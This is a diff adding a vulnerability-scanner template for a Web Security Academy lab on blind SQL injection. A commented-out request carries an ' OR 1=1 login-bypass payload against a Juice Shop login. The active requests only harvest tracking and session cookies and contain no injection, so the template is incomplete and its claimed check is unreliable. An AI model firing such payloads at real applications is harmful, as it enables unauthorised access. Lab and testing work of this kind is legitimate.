@@ -1,0 +1,76 @@
+id: WSA-blind-sqli-conditional-responses
+info:
+  name: WSA-blind-sqli-conditional-responses
+  author: destiny
+  severity: critical
+  description: WSA Exploiting blind SQL injection by triggering conditional responses
+  reference: https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses
+  tags: web-security-academy
+
+# requests:
+  # - method: POST
+  #   path:
+  #     - "http://{{BaseURL}}#/login"
+  #   body: \{\"email\":\"' OR 1=1 --admin\",\"password\":\"5ecr37\"\}
+  #   matchers:
+  #     - type: status
+  #       status:
+  #         - 200
+  #     - type: word
+  #       words:
+  #         - \"umail\":\"admin@juice-sh.op\"
+requests:
+# First we extract the trackingID Cookie
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+        Connection: close
+    extractors:
+      - type: kval
+        name: trackingid-cookie
+        internal: true
+        kval:
+          - "TrackingId"
+        part: header
+      - type: kval
+        name: session-cookie
+        internal: true
+        kval:
+          - "session"
+        part: header
+  - raw:
+      - |
+        GET /{{trackingid-cookie}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: TrackingID={{trackingid-cookie}}; session={{session-cookie}}
+        Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+        Connection: close
+    matchers:
+      - type: word
+        words:
+          - "Welcome"
+        part: body
